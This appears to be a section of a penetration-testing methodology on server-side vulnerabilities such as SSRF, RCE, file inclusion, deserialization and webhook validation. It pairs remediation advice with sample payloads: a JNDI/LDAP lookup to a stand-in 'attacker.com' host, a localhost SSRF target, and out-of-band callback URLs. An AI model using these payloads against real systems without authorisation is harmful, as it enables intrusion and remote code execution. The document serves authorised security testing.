# 03 — SERVER-SIDE VULNERABILITIES
Applicable to: Open Source, Live Domain, API

---

## Types
- SSRF
- RCE
- File Inclusion
- Deserialization
- Webhook Validation Weak/Missing

---

## Identification
- Parameters that point to URLs
- Unvalidated file uploads
- Serialized objects
- Unsigned or weakly signed webhooks

---

## Payload
- `http://127.0.0.1:80`
- `${jndi:ldap://attacker.com/a}`
- OAST/Out-of-band callback (for blind SSRF)

---

## Remediation
- Allowlist
- Sanitization
- Disable internal protocols
- Verify webhook signatures + replay protection

---

## 📋 Test Template (expected input/output)

- **Objective:** verify input that controls fetch, include, or server-side execution.
- **Controlled input:** external URL or resource reference with an allowed domain.
- **Test variant:** replace with a benign internal endpoint or OAST.
- **Execution steps:** 1) baseline to public URL 2) variant to OAST.
- **Expected safe output:** request blocked or validated against allowlist.
- **Indicative vulnerable output:** OAST callback or response with internal content.
- **Evidence to save:** URL, DNS logs, timestamp.
- **Context notes:** no internal scanning; only controlled proof-of-access.

### Sample baseline + variant
- **Baseline:** `url=https://example.com/ok` → **Variant:** `url=http://127.0.0.1:80`
- **Baseline:** `callback=https://example.com/webhook` → **Variant:** `callback=https://oast.example/trace`